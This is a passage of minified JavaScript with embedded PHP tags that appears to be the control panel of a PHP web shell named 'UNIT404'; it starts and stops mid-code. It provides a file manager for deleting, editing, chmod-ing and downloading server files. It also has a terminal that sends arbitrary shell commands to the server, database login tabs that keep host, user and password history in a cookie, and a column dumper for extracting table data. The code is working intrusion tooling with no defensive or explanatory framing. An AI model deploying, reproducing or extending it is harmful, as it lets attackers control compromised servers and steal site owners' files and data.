0!==mysql_cache[t]&&mysql_cache[t].hasOwnProperty("db")&&mysql_cache[t].db.length>0&&"update"!=a&&(d.querySelector("#tab_"+t+">span").innerHTML=mysql_cache[t].db),$(t).querySelectorAll(".db-opt-id").forEach(function(e){e.setAttribute("db_id",t)});try{$(t).querySelector(".getconfig").setAttribute("base_id",t)}catch(e){}database_window_is_minimized||(d.body.style.overflow="hidden")}function loadPopUpOpTions(e,t){console.log(e),UNIT404_before_do_action_id="",$("options_window").style.display="block";var a=$("option_"+e);if(UNIT404_can_add_opt){UNIT404_can_add_opt=!1;try{d.querySelector(".options_holder.option_is_active").classList.remove("option_is_active")}catch(e){}var i="",l=$("menu_opt_"+e).innerHTML;"market"==e?l="NeverDie Market":"GetDisFunc"==e&&(l="Disable Functions");try{d.querySelector("#options_window .content_options_holder .options_tab .tab_name.tab_is_active").classList.remove("tab_is_active")}catch(e){}if(null!=a){var r=a.getAttribute("opt_count");null!=r?(i=parseInt(r)+1,a.setAttribute("opt_count",i)):(i=1,a.setAttribute("opt_count",i))}var o="option_"+e+i;d.querySelector("#options_window .content_options_holder .options_content").insertAdjacentHTML("afterbegin",'<div id="'+o+'" class="options_holder">'+t+"</div>"),d.querySelector("#options_window .content_options_holder .options_tab").insertAdjacentHTML("beforeend",'<div opt_id="'+o+'" onclick="optionsTabController(this);" title="'+l+'" id="tab_'+o+'" class="tab_name tab_is_active">'+l+' <span opt_id="'+o+'" onclick="closeOption(this,event);return false;" title="[close]" style="cursor:pointer;color:#ff4444;font-weight:bold;font-size:14px;margin-left:5px;">X</span></div>'),$(o).classList.toggle("option_is_active"),d.querySelectorAll("#"+o+" form, #"+o+" a").forEach(function(t){var a=t.classList.value;if("getconfig"==a||"rejectme"==a)return!1;if("FORM"==t.tagName){var l=t.getAttribute("onsubmit");t.setAttribute("onsubmit",'UNIT404BeforeDoAction("'+e+i+'");'+l),t.setAttribute("opt_id",e+i)}else{l=t.getAttribute("onclick");t.setAttribute("onclick",'UNIT404BeforeDoAction("'+e+i+'");'+l)}});try{$(o).querySelector(".getconfig").setAttribute("base_id",e+i)}catch(e){}return e+i}a.innerHTML=t;var n=$("tab_option_"+e);null!=n&&((-1==n.classList.value.indexOf("tab_is_active")||options_window_is_minimized)&&(n.classList.add("tab-is-done"),UNIT404ShowNotification("proccess is done...",n.innerText)),options_window_is_minimized&&UNIT404UpdateOptionsBadge("options_window")),d.querySelectorAll("#option_"+e+" form, #option_"+e+" a").forEach(function(t){var a=t.classList.value;if("getconfig"==a||"rejectme"==a)return!1;if("FORM"==t.tagName){var i=t.getAttribute("onsubmit");t.setAttribute("onsubmit",'UNIT404BeforeDoAction("'+e+'");'+i),t.setAttribute("opt_id",e)}else{i=t.getAttribute("onclick");t.setAttribute("onclick",'UNIT404BeforeDoAction("'+e+'");'+i)}});try{a.querySelector(".getconfig").setAttribute("base_id",e)}catch(e){}options_window_is_minimized||(d.body.style.overflow="hidden")}function UNIT404BeforeDoAction(e){UNIT404_before_do_action_id=e}function UNIT404LoaderOnTop(e){$("a_loader").style.display=e,d.body.style.overflow="block"==e?"hidden":"visible"}function UNIT404AjaxController(e){var t=e.getAttribute("parent");$("loader_"+t).remove(),"filesman_holder"==t.substr(0,15)&&($(t).style.minHeight="0"),_UNIT404_AJAX_.hasOwnProperty(t)&&_UNIT404_AJAX_[t].abort()}function closeDatabase(e,t){t.stopPropagation();var a=e.getAttribute("opt_id");if($(a).remove(),-1!=$("tab_"+a).classList.value.indexOf("sql-active-tab"))if((e=d.querySelectorAll(".sql-tabs .sql-tabname")).length>1){e[0].classList.add("sql-active-tab");var i=e[0].getAttribute("opt_id");null!=$(i)&&$(i).classList.toggle("sql-active-content")}else editorClose("database_window");d.querySelector("div[opt_id="+a+"]").remove()}function closeFmTab(e,t){t.stopPropagation();var a=e.getAttribute("fm_id"),i=$("filesman_tab_"+a);if(-1!=i.classList.value.indexOf("filesman-tab-active")&&(e=d.querySelectorAll("#filesman_tabs .filesman_tab")).length>1){e[0].classList.add("filesman-tab-active");var l=e[0].getAttribute("fm_id"),r="filesman_holder_"+l;if(null!=$(r)){$(r).classList.toggle("filesman-active-content");var o=$("filesman_tab_"+l).getAttribute("path");initDir(o),d.mf.c.value=o,UNIT404_current_fm_id=l}}i.remove(),$("filesman_holder_"+a).remove(),UNIT404FilesmanTabHideTitle()}function closeOption(e,t){t.stopPropagation();var a=e.getAttribute("opt_id");if($(a).remove(),-1!=$("tab_"+a).classList.value.indexOf("tab_is_active"))if((e=d.querySelectorAll(".options_tab .tab_name")).length>1){e[0].classList.add("tab_is_active");var i=e[0].getAttribute("opt_id");null!=$(i)&&$(i).classList.toggle("option_is_active")}else editorClose("options_window");d.querySelector("div[opt_id="+a+"]").remove()}function historyPanelController(e){"hidden"==e.getAttribute("mode")?(d.querySelector(".editor-explorer").style.display="block",d.querySelector(".editor-modal").style.marginLeft="20%",e.setAttribute("mode","visible"),e.style.left="19%",e.innerHTML="<<"):(d.querySelector(".editor-explorer").style.display="none",d.querySelector(".editor-modal").style.marginLeft="1%",e.setAttribute("mode","hidden"),e.style.left="0%",e.innerHTML=">>")}function closeTerminalContent(e,t){t.stopPropagation();var a=e.getAttribute("term_id");if(($(a).remove(),-1!=$("tab_"+a).classList.value.indexOf("active-terminal-tab"))&&(e=d.querySelectorAll(".terminal-tabs .terminal-tab")).length>1){e[0].classList.add("active-terminal-tab");var i=e[0].getAttribute("term_id");null!=$(i)&&$(i).classList.toggle("active-terminal-content")}d.querySelector("div[term_id="+a+"]").remove()}function closeEditorContent(e,t){t.stopPropagation();var a=e.getAttribute("opt_id");if(($(a).remove(),-1!=$("tab_"+a).classList.value.indexOf("editor-tab-active"))&&(e=d.querySelectorAll(".editor-tabs .editor-tab-name")).length>1){e[0].classList.add("editor-tab-active");var i=e[0].getAttribute("opt_id");null!=$(i)&&$(i).classList.toggle("editor-content-active")}d.querySelector("div[opt_id="+a+"]").remove()}function optionsTabController(e){try{d.querySelector(".options_holder.option_is_active").classList.remove("option_is_active")}catch(e){}var t=e.getAttribute("opt_id");if(null==t)return!1;$(t).classList.toggle("option_is_active");try{d.querySelector("#options_window .content_options_holder .options_tab \t.tab_name.tab_is_active").classList.remove("tab_is_active")}catch(e){}e.classList.remove("tab-is-done"),e.classList.add("tab_is_active"),d.querySelector(".opt-title").innerHTML=e.getAttribute("title"),UNIT404UpdateOptionsBadge("options_window")}function terminalTabController(e){try{d.querySelector(".terminal-tab.active-terminal-tab").classList.remove("active-terminal-tab")}catch(e){}try{d.querySelector(".terminal-content.active-terminal-content").classList.remove("active-terminal-content")}catch(e){}var t=e.getAttribute("term_id");if(null==t)return!1;$(t).classList.toggle("active-terminal-content"),e.classList.remove("tab-is-done"),e.classList.add("active-terminal-tab"),$(t).querySelector(".php-terminal-input").focus(),UNIT404UpdateOptionsBadge("cgiloader")}function filesmanTabController(e){try{d.querySelector(".ajaxarea.filesman-active-content").classList.remove("filesman-active-content")}catch(e){}try{d.querySelector(".filesman_tab.filesman-tab-active").classList.remove("filesman-tab-active")}catch(e){}var t=e.getAttribute("fm_id");if(null==t)return!1;UNIT404_current_fm_id=t,e.classList.add("filesman-tab-active"),e.classList.remove("tab-is-done"),$("filesman_holder_"+t).classList.toggle("filesman-active-content");var a=e.getAttribute("path");initDir(a),d.mf.c.value=a}function dbTabController(e){try{d.querySelector(".sql-content.sql-active-content").classList.remove("sql-active-content")}catch(e){}try{d.querySelector(".sql-tabname.sql-active-tab").classList.remove("sql-active-tab")}catch(e){}var t=e.getAttribute("opt_id");if(null==t)return!1;$(t).classList.toggle("sql-active-content"),e.classList.remove("tab-is-done"),e.classList.add("sql-active-tab"),UNIT404UpdateOptionsBadge("database_window")}function editorTabController(e,t){try{d.querySelector(".editor-contents.editor-content-active").classList.remove("editor-content-active")}catch(e){}var a=null;void 0===t?a=e.getAttribute("opt_id"):(a=e,e=$("tab_"+a));var i=editor_files["file_"+a.replace("editor_source_","")];if(void 0!==i&&(d.querySelector(".editor-path").innerHTML=(i.pwd+"/"+i.file).replace(/\/\//g,"/")),null==a)return!1;$(a).classList.toggle("editor-content-active");try{d.querySelector(".editor-tabs .editor-tab-name.editor-tab-active").classList.remove("editor-tab-active")}catch(e){}e.classList.remove("tab-is-done"),e.classList.add("editor-tab-active"),UNIT404UpdateOptionsBadge("editor")}function UNIT404UpdateOptionsBadge(e){var t=d.querySelector("#"+e+"-minimized .options_min_badge");if(null!=t){var a=d.querySelectorAll("#"+e+" .tab-is-done").length;t.innerHTML=a,t.style.visibility=a>0?"visible":"hidden"}}function UNIT404OpenPhpTerminal(e){if(php_temrinal_using_cgi&&void 0===e)showEditor("cgiloader");else{$("cgiloader").style.display="block",$("cgiloader").style.background="rgba(0, 0, 0, 0.57)",$("cgiframe").style.background="rgba(0, 0, 0, 0.81)",$("cgiframe").style.border="1px solid rgb(109 0 0)",$("cgiframe").style.height="90%",$("cgiframe").style.padding="3px",d.querySelector("#cgiloader .opt-title").innerHTML="Terminal";var t="",a="",i="terminal_id_"+getRandom(10);void 0===e&&(t=" active-terminal-content",a=" active-terminal-tab"),d.querySelector("#cgiframe .terminal-contents").insertAdjacentHTML("afterbegin",'<div id="'+i+'" class="terminal-content'+t+'"><div class="php-terminal-output"><div><button class="terminal-btn-fontctl" onClick="changeTerminalFontSize(\''+i+'\',1);">+</button><button class="terminal-btn-fontctl" onClick="changeTerminalFontSize(\''+i+"',0);\">-</button><input onchange=\"UNIT404TerminalChangecolor(this,'"+i+'\');" style="height: 18px;background: #dde2e2;" type="color"></div><pre class="ml1" style="border:unset;height: 90%;"></pre></div><div><form term_id="'+i+'" onSubmit="UNIT404ExecTerminal(this);this.c.value=\'\';return false;" autocomplete="off" style="margin-top: 10px;"><div style="overflow: auto;white-space: nowrap;"><div style="display: inline-block;color:#ffffff;margin-bottom:5px;margin-right:5px;">CWD:~# </div><div style="display: inline-block;color:#fff;" class="php-terminal-current-dir"></div></div><div style="position:relative;"><span style="color: #00ff08;font-size: 25px;">$ </span><input style="padding: 8px;font-size: 20px;width: 67%;border: 1px solid #F8F8FF;padding-right:35px;" onkeyup="UNIT404WalkInTerminalHistory(this,event,\''+i+'\');" term_id="'+i+'" class="php-terminal-input" type="text" name="c" onfocus="closeHistoryCmd(\'free\',this);" placeholder="ls -la"><button class="button" style="color: #F8F8FF;padding: 12px;margin-left: 10px;border-radius: 2px;font-weight: bolder;">ExeCute<button term_id="'+i+'" class="button" style="color: #F8F8FF;padding: 12px;margin-left: 10px;border-radius: 2px;font-weight: bolder;" onClick="UNIT404ExecTerminal(this, 1);return false;">Current Dir</button><div class="cmd-history-holder"><div class="commands-history-header">History</div><span onClick="clearTerminalHistory();" style="border-bottom: 1px solid;margin-bottom: 5px;display: inline-block;padding: 5px;color: #ffffff;cursor: pointer;">Clear history</span><div style="overflow: auto;height: 82%;" class="commands-history"></div></div><div term_id="'+i+'" class="cmd-history-icon" mode="" onclick="closeHistoryCmd(this);"><img style="width:27px;" src="https://i.gyazo.com/4134275e14c76c4cce6ab485c6485757.png"></div></form></div></div></div>');try{$("terminal_new_tab").remove()}catch(e){}d.querySelector("#cgiframe .terminal-tabs").insertAdjacentHTML("beforeend",'<div onclick="terminalTabController(this);" term_id="'+i+'" id="tab_'+i+'" class="terminal-tab'+a+'">Terminal <span term_id="'+i+'" onclick="closeTerminalContent(this,event);return false;" title="[close]" style="cursor:pointer;color:#ff4444;font-weight:bold;font-size:14px;margin-left:5px;">X</span></div>'),d.querySelector("#cgiframe .terminal-tabs").insertAdjacentHTML("beforeend",'<div onclick="UNIT404OpenPhpTerminal(true);" id="terminal_new_tab" style="background-color:#ffffff;" class="terminal-tab">New Tab +</div>'),terminal_walk_index[i]={index:0,key:-1},d.querySelector("#"+i+" .php-terminal-input").focus(),d.querySelector("#"+i+" .php-terminal-current-dir").innerHTML=c_,d.querySelector("#cgiloader-minimized .minimized-text").innerHTML="Terminal",UNIT404TerminalSetColorAndSize(i),php_temrinal_using_cgi=!0;var l=UNIT404GetTerminalHistory();for(var r in l)d.querySelector("#"+i+" .cmd-history-holder .commands-history").insertAdjacentHTML("afterbegin","<div onclick=\"d.querySelector('#"+i+' .php-terminal-input\').value = this.innerHTML;" class="history-cmd-line">'+l[r]+"</div>")}d.body.style.overflow="hidden"}function UNIT404TerminalSetColorAndSize(e){var t=getCookie("UNIT404-terminal-color"),a=getCookie("UNIT404-terminal-fontsize");void 0!==t&&(d.querySelector("#"+e+" pre.ml1").style.color=t),void 0!==a&&(d.querySelector("#"+e+" pre.ml1").style.fontSize=a)}function UNIT404TerminalChangecolor(e,t){d.querySelector("#"+t+" pre.ml1").style.color=e.value,setCookie("UNIT404-terminal-color",e.value,2012)}function UNIT404GetTerminalHistory(e){var t=getCookie("UNIT404-terminal-history");try{t=atob(t),t=JSON.parse(t)}catch(e){t=[]}return void 0!==e&&t.reverse(),t}function changeTerminalFontSize(e,t){var a=d.querySelector("#"+e+" pre.ml1"),i=parseInt(window.getComputedStyle(a,null).getPropertyValue("font-size")),l="";1==t?(l=i+1+"px",a.style.fontSize=l):(l=i-1+"px",a.style.fontSize=l),setCookie("UNIT404-terminal-fontsize",l,2012)}function UNIT404WalkInTerminalHistory(e,t,a){var i=t||window.event;if("38"==i.keyCode||"40"==i.keyCode||"37"==i.keyCode||"39"==i.keyCode)switch(i.keyCode){case 38:var l=UNIT404GetTerminalHistory(!0),r="";0==terminal_walk_index[a].index?(0==terminal_walk_index[a].key&&++terminal_walk_index[a].index,void 0!==(r=l[terminal_walk_index[a].index])?(e.value=r,++terminal_walk_index[a].index):(e.value="",terminal_walk_index[a].index=0)):terminal_walk_index[a].index<l.length&&(0==terminal_walk_index[a].key&&++terminal_walk_index[a].index,e.value=l[terminal_walk_index[a].index],++terminal_walk_index[a].index),terminal_walk_index[a].key=1;break;case 40:l=UNIT404GetTerminalHistory(!0);if(terminal_walk_index[a].index>=0)0!=terminal_walk_index[a].index&&(--terminal_walk_index[a].index,1==terminal_walk_index[a].key&&--terminal_walk_index[a].index),void 0!==(r=l[terminal_walk_index[a].index])?e.value=r:(e.value="",terminal_walk_index[a].index=0);terminal_walk_index[a].key=0;break;default:console.log(i.keyCode)}else terminal_walk_index[a].index=0}function clearTerminalHistory(){d.querySelectorAll(".commands-history").forEach(function(e){e.innerHTML=""}),setCookie("UNIT404-terminal-history","",2012)}function UNIT404AceToFullscreen(e){var t=e.getAttribute("ace_id");UNIT404_ace_editors.editor[t].container.requestFullscreen()}function closeHistoryCmd(e,t){if("free"==e){var a=t.getAttribute("term_id");return e=d.querySelector("#"+a+" .cmd-history-icon"),d.querySelector("#"+a+" .cmd-history-holder").style.visibility="hidden",d.querySelector("#"+a+" .cmd-history-holder").style.opacity="0",e.setAttribute("mode","off"),!1}var i=e.getAttribute("mode"),l=(a=e.getAttribute("term_id"),d.querySelector("#"+a+" .cmd-history-holder"));0==i.length||"off"==i?(l.style.visibility="visible",l.style.opacity="1",e.setAttribute("mode","on")):(l.style.visibility="hidden",l.style.opacity="0",e.setAttribute("mode","off"))}function geEvalAceValue(e){var t=e.querySelector(".php-evals-ace").getAttribute("id");return UNIT404_ace_editors.eval[t].getValue()}function UNIT404OpenArchive(e){var t=e.getAttribute("path"),a=e.getAttribute("fname"),i=e.getAttribute("base_id");if(".."==a&&"phar://"!=t.substr(0,7))return!1;var l="a="+UNIT404b64("open_archive_dir")+"&c="+UNIT404b64(c_)+"&UNIT4041="+UNIT404b64(t)+"&UNIT4042="+UNIT404b64(i)+"&ajax="+UNIT404b64("true");_Ajax(d.URL,l,function(e){if("0"!=e){$("archive_base_"+i).innerHTML=e;var a=$("archive_dir_"+i).getAttribute("archive_name"),l=$("archive_dir_"+i).getAttribute("archive_full"),r="",o="";if(0!=(t=t.split(a)[1]).length){var n=(t=t.split("/")).length-1;for(var s in 0==t[n].length&&t.splice(n,1),t)0!=t.length&&(o+=t[s]+"/",r+='<a base_id="'+i+'" fname="'+t[s]+'" path="'+l+o+'" onclick="UNIT404OpenArchive(this);">'+t[s]+"/</a>")}d.querySelector("#archive_dir_"+i+" .archive_pwd_holder").innerHTML=r}},!1,"open_archive_dir")}function UNIT404DeleteConnectToDb(e){d.querySelectorAll(".dbh_"+e).forEach(function(e){e.remove()}),UNIT404ConnectionHistoryUpdate(e)}function UNIT404ConnectToDb(e,t){var a={};try{a=JSON.parse(atob(getCookie("UNIT404_connection_hist")))}catch(e){}var i=d.querySelector("#"+t+" div.sf");i.querySelector("input[name=sql_host]").value=a[e].host,i.querySelector("input[name=sql_login]").value=a[e].user,i.querySelector("input[name=sql_pass]").value=a[e].pass,(i.querySelector("input[name=sql_base]")?i.querySelector("input[name=sql_base]"):i.querySelector("select[name=sql_base]")).value=a[e].db,i.querySelector("input[name=sql_count]").checked=!0,d.querySelector("#"+t+" div.sf .db-connect-btn").click()}function UNIT404ShowConnectionHistory(e){var t={},a=e.getAttribute("db_id"),i=e.getAttribute("mode");if(rows='<table class="connection-hist-table"><tr><th>*</th><th>Host</th><th>User</th><th>Pass</th><th>Database</th><th>Connect</th><th>Delete</th></tr>',"on"==i){e.setAttribute("mode","off");try{t=JSON.parse(atob(getCookie("UNIT404_connection_hist")))}catch(e){}var l,r=1;for(l in t){var o=t[l].user+"_"+t[l].db;rows+='<tr class="dbh_'+o+'"><th>'+r+"</th><th>"+t[l].host+"</th><th>"+t[l].user+"</th><th>"+t[l].pass+"</th><th>"+t[l].db+'</th><th><button style="margin: unset;" class="connection-his-btn" onclick=\'UNIT404ConnectToDb("'+o+'","'+a+'");\'>Connect</button></th><th style="text-align: center;"><button style="margin: unset;" class="connection-his-btn connection-delete" onclick=\'UNIT404DeleteConnectToDb("'+o+"\");'>X</button></th></tr>",r++}rows+="</table"}else e.setAttribute("mode","on"),rows="";d.querySelector("#"+a+" .connection_history_holder").innerHTML=rows}function UNIT404ConnectionHistoryUpdate(e){var t,a={};try{a=JSON.parse(atob(getCookie("UNIT404_connection_hist")))}catch(e){}for(t in mysql_cache)0!=mysql_cache[t].db.length&&(a[mysql_cache[t].user+"_"+mysql_cache[t].db]=mysql_cache[t]);void 0!==e&&delete a[e],setCookie("UNIT404_connection_hist",btoa(JSON.stringify(a)),2012)}function UNIT404ExecTerminal(e,t){var a="";if(0==(a=void 0!==t?"cd "+c_:e.c.value).length)return!1;"l"==a?a="ls -trh --color":"ll"==a&&(a="ls -ltrh --color");var i=e.getAttribute("term_id");UNIT404loader(i,"block"),closeHistoryCmd("free",e);var l="";"FORM"==e.tagName&&(l=e.querySelector(".php-terminal-current-dir").innerHTML),0==(l=l.trim()).length&&(l=c_);var r="a="+UNIT404b64("terminalExec")+"&c="+UNIT404b64(l)+"&UNIT4041="+UNIT404b64(a)+"&ajax="+UNIT404b64("true");if(_Ajax(d.URL,r,function(e,t){UNIT404loader(t,"none");try{var a=$("tab_"+i);null!=a&&((-1==a.classList.value.indexOf("active-terminal-tab")||cgi_is_minimized)&&(a.classList.add("tab-is-done"),UNIT404ShowNotification("proccess is done...",a.innerText)),cgi_is_minimized&&UNIT404UpdateOptionsBadge("cgiloader"))}catch(e){}e=JSON.parse(e),d.querySelector("#"+t+" .php-terminal-output > pre").innerHTML=e.output,0!=e.path.length&&(d.querySelector("#"+t+" .php-terminal-current-dir").innerHTML=e.path)},!1,i),void 0===t){d.querySelector("#"+i+" .cmd-history-holder .commands-history").insertAdjacentHTML("afterbegin","<div onclick=\"d.querySelector('#"+i+' .php-terminal-input\').value = this.innerHTML;" class="history-cmd-line">'+a+"</div>");var o=UNIT404GetTerminalHistory(),n=o.indexOf(a);-1!=n&&o.splice(n,1),o.push(a),setCookie("UNIT404-terminal-history",btoa(JSON.stringify(o)),2012)}d.querySelector("#"+i+" input.php-terminal-input").focus()}function pageChangedFilesMan(e){var t="filesman_holder_"+UNIT404_current_fm_id,a=getCookie(t+"_page_number"),i=e.innerText;if("<<"==i){a=d.querySelector("#"+t+" .active-page-number").innerText;if(!((a=parseInt(a))>1))return!1;i=a-1}if(">>"==i){a=d.querySelector("#"+t+" .active-page-number").innerText;a=parseInt(a);var l=d.querySelector("#"+t+" .last-page-number").innerHTML;if(!(a+1<=(l=parseInt(l))))return!1;i=a+1}setCookie(t+"_page_number",i,2012),g("FilesMan",c_)}function UNIT404ColDumperInit(){var e=d.querySelector(".tab_name.tab_is_active").getAttribute("opt_id"),t=d.querySelector("#"+e),a=t.getElementsByClassName("box");for(i=0;i<a.length;i++)a[i].addEventListener("click",function(){null!=this.parentElement.querySelector(".nested")&&(this.parentElement.querySelector(".nested").classList.toggle("active"),this.classList.toggle("check-box"))});var i;a=t.getElementsByClassName("sub-box");for(i=0;i<a.length;i++)a[i].setAttribute("opt_id",e),a[i].addEventListener("click",function(){this.classList.toggle("check-box");var e=this.getAttribute("tbl"),t=this.getAttribute("opt_id");t=t.replace("option_",""),col_dumper_selected_data.hasOwnProperty(t)||(col_dumper_selected_data[t]={}),void 0===col_dumper_selected_data[t][e]&&(col_dumper_selected_data[t][e]=[]);var a=this.innerHTML,i=col_dumper_selected_data[t][e].indexOf(a);-1==i?col_dumper_selected_data[t][e].push(a):col_dumper_selected_data[t][e].splice(i,1)})}function showSymlinkPath(e,t){t.stopPropagation();var a=e.getAttribute("row"),i=$("td_row_"+a),l=e.getAttribute("opt_title"),r=e.getAttribute("fname");if(l=decodeURIComponent(r)+" -> "+l,null!=i){i.insertAdjacentHTML("afterbegin",'<div class="symlink_path" id="link_id_'+a+'">'+l+"</div>");var o=t.clientX,n=t.clientY-30;$("link_id_"+a).style.left=o+"px",$("link_id_"+a).style.top=n+"px"}}function hideSymlinkPath(e,t){t.stopPropagation(),$("link_id_"+e.getAttribute("row")).remove()}function UNIT404getFlags(){data="a="+UNIT404b64("get_flags")+"&c="+UNIT404b64(c_)+"&ajax="+UNIT404b64("true"),_Ajax(d.URL,data,function(e){var t=JSON.parse(e);t.hasOwnProperty("server")&&(d.querySelectorAll(".flag-holder")[0].innerHTML='<img draggable="false" title="'+t.server.name+'" src="http://solevisible.com/images/flags/48/'+t.server.code.toLowerCase()+'.png">',d.querySelectorAll(".flag-holder")[0].style.display="inline"),t.hasOwnProperty("client")&&(d.querySelectorAll(".flag-holder")[1].innerHTML='<img draggable="false" title="'+t.client.name+'" src="http://solevisible.com/images/flags/48/'+t.client.code.toLowerCase()+'.png">',d.querySelectorAll(".flag-holder")[1].style.display="inline")})}function colDumplerSelectType(e){var t=e.options[e.selectedIndex].value;$("coldumper-delimiter-input").style.display="delimiter"==t?"inline-block":"none"}function UNIT404CheckUrlHash(){var e=window.location.hash.substr(1),t=e.split("&").reduce(function(e,t){var a=t.split("=");return e[a[0]]=a[1],e},{});if(""!=e)switch(t.action){case"fileman":case"options":t.path=decodeURIComponent(t.path),g("FilesMan",t.path,function(e){if(t.hasOwnProperty("file")){var a="auto";isArchive(t.file)&&(a="view"),editor(t.path+"/"+t.file,a,"","","","file")}}),"options"==t.action&&t.hasOwnProperty("opt")&&(UNIT404_can_add_opt=!0,g(t.opt,null,"","",""),d.querySelector(".opt-title").innerHTML=$("menu_opt_"+t.opt).innerHTML),t.hasOwnProperty("file")||editorClose("editor"),t.hasOwnProperty("opt")||editorClose("options_window"),editorClose("cgiloader");break;default:g("FilesMan","<?php echo $GLOBALS["cwd"]; ?>"),editorClose("editor"),editorClose("options_window"),editorClose("cgiloader")}else g("FilesMan","<?php echo $GLOBALS["cwd"]; ?>"),editorClose("editor"),editorClose("options_window"),editorClose("cgiloader")}function UNIT404FmngrContextRow(){d.querySelectorAll(".fmanager-row a.main_name").forEach(function(e){e.addEventListener("contextmenu",function(e){var t=e.target,a="";if(".."==(a="A"==e.target.parentElement.tagName?(t=e.target.parentElement).getAttribute("fname"):t.getAttribute("fname")))return!1;var i=t.getAttribute("id"),l=t.getAttribute("path"),r=t.getAttribute("ftype"),o=["newtab","link","download","view","edit","move","copy","rename","modify","permission","compress","extract","delete"];for(var n in"file"!=r||isArchive(a)?o[3]="view_archive":o.splice(11,1),"folder"==r&&(o=["newtab","link","move","copy","rename","modify","permission","compress","delete"]),UNIT404SortMenuItems(o),o){var s=d.querySelector("#rightclick_menu > a[name="+o[n]+"]");switch(s.setAttribute("fid",i),s.setAttribute("fname",decodeURIComponent(a)),s.setAttribute("path",l),s.setAttribute("ftype",r),o[n]){case"view":case"edit":var c="auto";"edit"==o[n]&&(c="edit"),s.setAttribute("href","#action=fileman&path="+c_+"/&file="+a),s.setAttribute("onclick","editor('"+a+"','"+c+"','','','','file')");break;case"newtab":var u=a;"file"==r?(u="&file="+a,s.setAttribute("href","#action=fileman&path="+c_+"/"+u),s.setAttribute("target","_blank"),s.onclick=function(){}):(s.setAttribute("href","javascript:void(0)"),s.removeAttribute("target"),s.onclick=function(){UNIT404FilesManNewTab(c_,u)});break;case"delete":s.setAttribute("onclick","var chk = confirm('Are You Sure For Delete # "+a+" # ?'); chk ? g('FilesMan',null,'delete', '"+a+"') : '';");break;case"download":s.setAttribute("onclick","g('FilesTools',null,'"+a+"', 'download')");break;case"permission":try{var p=d.querySelector("#id_chmode_"+i.replace("id_","")+" span").innerHTML;s.setAttribute("perm",p.trim())}catch(e){}break;case"link":s.style.display="block";var f="<?php echo $_SERVER["DOCUMENT_ROOT"]; ?>/",m=(c_+"/"+a).replace(/\/\//g,"/");if(-1!=m.indexOf(f)){f=m.replace(f,"");var b=location.origin+"/"+f;s.setAttribute("href",""+b)}else s.style.display="none"}}var y=e.clientX,_=e.clientY;UNIT404RightClickMenu(y,_),e.preventDefault()})})}function UNIT404FilesManNewTab(e,t,a){var i=t;void 0!==a&&(i=UNIT404GetLastFolderName(e));var l=decodeURIComponent(e+"/"+t);l=l.replace(/\/\//g,"/");var r=$("filesman_tab_1"),o=r.getAttribute("fm_counter");o=parseInt(o)+1,r.setAttribute("fm_counter",o),d.querySelector("#filesman_tabs_child").insertAdjacentHTML("beforeend",'<div onmouseover="UNIT404FilesmanTabShowTitle(this,event);" onmouseout="UNIT404FilesmanTabHideTitle(this,event);" path="'+l+'" id="filesman_tab_'+o+'" fm_id="'+o+'" onclick="filesmanTabController(this);" fname="'+t+'" class="filesman_tab"><img class="folder-tab-icon" src="data:image/png;base64,"> <span class="filesman-tab-folder-name">'+i+'</span> <span fm_id="'+o+'" onclick="closeFmTab(this,event);return false;" title="[close]" style="cursor:pointer;color:#ff4444;font-weight:bold;font-size:14px;margin-left:5px;">X</span></div>'),d.querySelector(".ajaxarea").insertAdjacentHTML("beforebegin",'<div style="position:relative;" fm_id="'+o+'" id="filesman_holder_'+o+'" class="ajaxarea"><div class="header"></div></div>'),UNIT404_fm_id=o,g("FilesMan",l),UNIT404_fm_id=0}function UNIT404FilesmanTabShowTitle(e,t){t.stopPropagation();var a=$("filesman-tab-full-path");a.style.display="block",a.style.top=e.offsetTop-37+"px",a.style.left=e.offsetLeft-$("filesman_tabs").scrollLeft+"px",a.innerHTML=e.getAttribute("path")}function UNIT404FilesmanTabHideTitle(e,t){$("filesman-tab-full-path").style.display="none"}function UNIT404PopupAction(e,t){var a="",i="";switch(t){case"rename":a="Old file name:",i="New file name:";break;case"copy":a="File path:",i="Enter the file path that you want to copy this file to:";break;case"move":a="Current Path:",i="Enter the file path that you want to move this file to:";break;case"extract":a="Files to extract:",i="Enter the path you wish to extract the files to and click Extract:"}var l=e.getAttribute("fname"),r=e.getAttribute("path"),o=t.charAt(0).toUpperCase()+t.slice(1);if("permission"==t){d.querySelector("#shortcutMenu-holder").style.height="222px",o="Change Permissions",d.querySelector("#shortcutMenu-holder > form > .perm-table-holder").style.display="block",d.querySelector("#shortcutMenu-holder > form > input[name=fname]").style.display="none";var n=e.getAttribute("perm"),s=n.substr(1,1),c=n.substr(2,1),u=n.substr(3,1);d.querySelector("#shortcutMenu-holder > form input[name=u]").value=s,d.querySelector("#shortcutMenu-holder > form input[name=g]").value=c,d.querySelector("#shortcutMenu-holder > form input[name=w]").value=u,autoCheckPerms(s,"u",["u","g","w"]),autoCheckPerms(c,"g"),autoCheckPerms(u,"w")}else d.querySelector("#shortcutMenu-holder").style.height="190px",d.querySelector("#shortcutMenu-holder > form > input[name=fname]").style.display="block",d.querySelector("#shortcutMenu-holder > form > .perm-table-holder").style.display="none";var p="move"==t||"copy"==t?r+l:l;if("modify"==t){var f="tr_row_"+e.getAttribute("fid").replace("id_","");p=d.querySelector("#"+f+" .main_modify").innerText}d.querySelector(".cl-popup-fixed").style.display="block",d.querySelector("#shortcutMenu-holder .popup-head").innerHTML=o,d.querySelector("#shortcutMenu-holder .old-path-lbl").innerHTML=a,d.querySelector("#shortcutMenu-holder .new-filename-lbl").innerHTML=i,d.querySelector("#shortcutMenu-holder .popup-foot > button[name=accept]").innerHTML=o,d.querySelector("#shortcutMenu-holder > form > .old-path-content").innerHTML=r+l,d.querySelector("#shortcutMenu-holder > form > input[name=fname]").value=p,d.querySelector("#shortcutMenu-holder button[name=accept]").setAttribute("fid",e.getAttribute("fid")),d.querySelector("#shortcutMenu-holder button[name=accept]").setAttribute("action",t)}function calcperm(){var e=event.srcElement;autoCheckPerms(e.checked,e.name.substr(0,1))}function autoCheckPerms(e,t,a){if(void 0!==a)for(var i in a){var l=a[i];d.querySelector("#shortcutMenu-holder > form input[name="+l+"r]").checked=!1,d.querySelector("#shortcutMenu-holder > form input[name="+l+"w]").checked=!1,d.querySelector("#shortcutMenu-holder > form input[name="+l+"x]").checked=!1}var r=d.querySelector("#shortcutMenu-holder > form input[name="+t+"r]"),o=d.querySelector("#shortcutMenu-holder > form input[name="+t+"w]"),n=d.querySelector("#shortcutMenu-holder > form input[name="+t+"x]");if("boolean"!=typeof 